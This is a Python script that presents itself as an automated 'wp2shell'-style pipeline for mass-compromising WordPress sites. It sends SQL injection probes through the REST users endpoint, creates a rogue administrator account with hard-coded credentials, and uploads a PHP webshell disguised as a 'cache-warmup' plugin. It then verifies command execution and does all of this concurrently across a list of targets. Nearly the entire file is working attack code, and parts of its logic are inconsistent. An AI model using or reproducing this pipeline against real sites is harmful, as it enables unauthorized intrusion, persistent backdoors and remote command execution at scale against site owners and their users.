"""wp2shell-style automated WordPress REST API exploitation pipeline.

Mirrors the CyberXero wp2shell flow described in the article: abuse a flaw in
the WordPress REST API to inject SQL, plant a rogue administrator account,
and drop a PHP webshell -- driven at machine speed across thousands of
targets in a single automated run.
"""
import base64
import io
import zipfile

import requests
from concurrent.futures import ThreadPoolExecutor

SQLI_PROBES = [
    "' UNION SELECT 1,2,@@version,4,5-- -",
    "' UNION SELECT null,user_login,user_pass,user_email FROM wp_users-- -",
    "' OR SLEEP(5)-- -",
    "1' AND BENCHMARK(5000000,MD5(1))-- -",
]

ROGUE_ADMIN = {
    "username": "svc_update",
    "email": "svc_update@example.com",
    "password": "P@ssw0rd!2026",
    "roles": ["administrator"],
}

WEBSHELL_PHP = "<?php @system($_REQUEST['c']); ?>"


def build_plugin_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("cache-warmup/cache-warmup.php", WEBSHELL_PHP)
    return buf.getvalue()


def inject_and_escalate(target):
    base = target.rstrip("/")
    # 1. SQL injection through the REST users search parameter.
    for probe in SQLI_PROBES:
        r = requests.get(
            base + "/wp-json/wp/v2/users",
            params={"search": probe, "per_page": 100},
            timeout=15,
        )
        if r.status_code == 200 and "user_login" in r.text:
            break
    # 2. Plant a rogue administrator account via the REST API.
    token = base64.b64encode(b"svc_update:P@ssw0rd!2026").decode()
    requests.post(
        base + "/wp-json/wp/v2/users",
        json=ROGUE_ADMIN,
        headers={"Authorization": "Basic " + token},
        timeout=15,
    )
    # 3. Drop the webshell as a plugin upload, then verify execution.
    requests.post(
        base + "/wp-json/wp/v2/plugins",
        files={"plugin": ("cache-warmup.zip", build_plugin_zip())},
        headers={"Authorization": "Basic " + token},
        timeout=30,
    )
    check = requests.get(
        base + "/wp-content/plugins/cache-warmup/cache-warmup.php",
        params={"c": "id"},
        timeout=15,
    )
    return "uid=" in check.text


def run(targets):
    with ThreadPoolExecutor(max_workers=64) as pool:
        results = list(pool.map(inject_and_escalate, targets))
    shells = sum(1 for ok in results if ok)
    print(f"deployed {shells} webshells out of {len(targets)} targets")
    return shells


if __name__ == "__main__":
    with open("targets.txt") as fh:
        run([line.strip() for line in fh if line.strip()])
